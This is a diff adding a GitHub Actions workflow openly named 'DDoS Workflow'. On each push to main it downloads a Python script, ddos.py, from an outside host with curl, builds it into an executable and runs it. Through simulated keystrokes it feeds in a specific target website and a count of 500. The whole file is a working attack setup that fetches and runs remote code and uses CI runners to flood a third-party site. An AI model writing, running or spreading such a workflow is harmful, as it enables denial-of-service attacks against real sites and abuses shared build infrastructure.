@@ -1,0 +1,52 @@
+name: DDoS Workflow
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  run_ddos:
+    runs-on: windows-latest
+
+    steps:
+    - name: Download ddos.py
+      run: |
+        mkdir ddos
+        cd ddos
+        curl -O https://oblakocornet.pythonanywhere.com/download/files/ddos.py
+
+    - name: Install requests
+      run: |
+        pip install requests
+
+    - name: Install pyinstaller
+      run: |
+        pip install pyinstaller
+
+    - name: Build ddos.exe
+      run: |
+        cd ddos
+        pyinstaller ddos.py -F
+
+    - name: Run ddos.exe
+      run: |
+        cd ddos\dist
+        Start-Process -FilePath .\ddos.exe -PassThru
+
+        # Wait for ddos.exe to start
+        Start-Sleep -Seconds 5
+
+        # Send "" and Enter to ddos.exe
+        Add-Type -AssemblyName System.Windows.Forms
+        [System.Windows.Forms.SendKeys]::SendWait("http://corasino.kesug.com{ENTER}")
+
+        # Wait for some time
+        Start-Sleep -Seconds 10
+
+        # Send "" and Enter to ddos.exe
+        [System.Windows.Forms.SendKeys]::SendWait("500{ENTER}")
+
+        # Wait for ddos.exe to finish
+        Start-Sleep -Seconds 120  # Adjust the time based on your requirements
